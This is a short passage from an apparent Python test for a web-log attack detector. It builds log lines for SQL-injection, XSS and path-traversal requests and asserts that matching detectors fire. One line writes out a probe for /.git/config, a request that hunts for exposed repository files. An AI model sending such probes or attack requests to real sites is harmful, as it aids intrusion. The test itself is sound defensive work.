        # the exact request shapes the loopback app logs (sqli / xss / traversal)
        log = "\n".join([aline(SQLI_TGT), aline(XSS_TGT), aline(TRAV_TGT),
                         aline("/.git/config", status=404), aline("/login", method="POST", status=401)])
        facts = d.facts(run_access_detections(log, **wire))
        fired = {det.oracle for det in facts}
        assert {"sqli_structure", "xss_structure", "path_traversal"} <= fired
